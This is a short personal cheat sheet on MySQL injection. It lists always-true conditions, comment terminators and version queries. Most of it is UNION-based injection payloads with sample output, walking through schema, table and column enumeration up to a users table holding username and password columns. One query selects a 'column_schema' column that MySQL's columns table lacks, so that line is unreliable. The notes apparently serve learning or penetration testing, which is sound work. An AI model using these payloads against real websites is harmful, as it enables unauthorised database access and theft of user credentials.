# MySQL Injection

## External stuff

https://www.exploit-db.com/papers/13045/

## My own stuff

### char tables

https://github.com/justin-p/sec-stuff/blob/master/general%20info/ascii-table.md   


### Always True

```
1=1
a=a
```

### Escape/stop

```sql
# 
-- 
#--
```

### MySQL Verison

select version()

### information Schema

#### Table names

SELECT table_schema,table_name FROM information_Schema.tables

SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables

SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables

#### Injection example 1

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--
``` 

```text
dummymalex:dummyms 
```

```text
table_schema = dummymalex
table_name  = dummyms
```

#### Hide stuff we dont need

AND table_schema != 'information_schema'

#### Injection example 2

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 AND table_schema != 'information_schema' ORDER BY table_name LIMIT 0,1) #--
```
```
LIMIT 0,1
dummymalex:dummyms 
```

```
table_schema = dummymalex
table_name   = dummyms 
```

```	
LIMIT 1,1 
dummymalex:users 	
```

```
table_schema = dummymalex
table_name   = users
```


#### column_name

SELECT column_schema,column_name FROM information_Schema.columns

#### Injection Example 1

```
' union (select CONCAT(column_name) from information_Schema.columns where table_name='dummyms' LIMIT 0,1) #--
LIMIT 0,1
	ID
LIMIT 1,1
	dummyms
LIMIT 2,1
	description
```

#### Injection Example 2

```
' union (select CONCAT(column_name) from information_Schema.columns where table_name='users' LIMIT 0,1) #--
LIMIT 0,1
	ID
LIMIT 1,1
	username
LIMIT 2,1
	password
```